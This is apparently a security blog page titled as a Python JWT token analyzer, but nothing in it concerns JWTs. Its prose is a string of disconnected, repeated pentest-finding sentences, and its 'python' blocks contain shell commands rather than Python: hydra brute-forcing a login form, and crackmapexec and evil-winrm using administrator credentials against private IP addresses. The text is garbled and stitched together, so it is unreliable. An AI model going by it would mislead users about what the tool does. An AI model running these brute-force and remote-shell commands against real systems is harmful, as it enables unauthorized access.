---
TitleSEO: "JWT Token Analyzer in Python | ZureFX"
TitlePost: "JWT Token Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for jwt token analyzer. Built for security research and automation."
Keywords: "powershell, go, c, fuzzer, bash, python"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-282.html"
URL_IMAGES: ""
Date: "2024-02-23"
Tags: "PowerShell, Go, C, Fuzzer, Bash, Python"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-282"
Permalink: "/scripting/script-jwt-token-analyzer-282.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `smbexec`
- `msfvenom`
- `ffuf`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.85.122.170 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.31.30.76 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
crackmapexec smb 10.57.165.165 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```python
nmap -sCV -p8888,464,139 10.97.83.188 -oN scan.txt
evil-winrm -i 10.94.181.6 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.58.88.17 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.85.113.118 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.68.199.185 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 15.44s
```
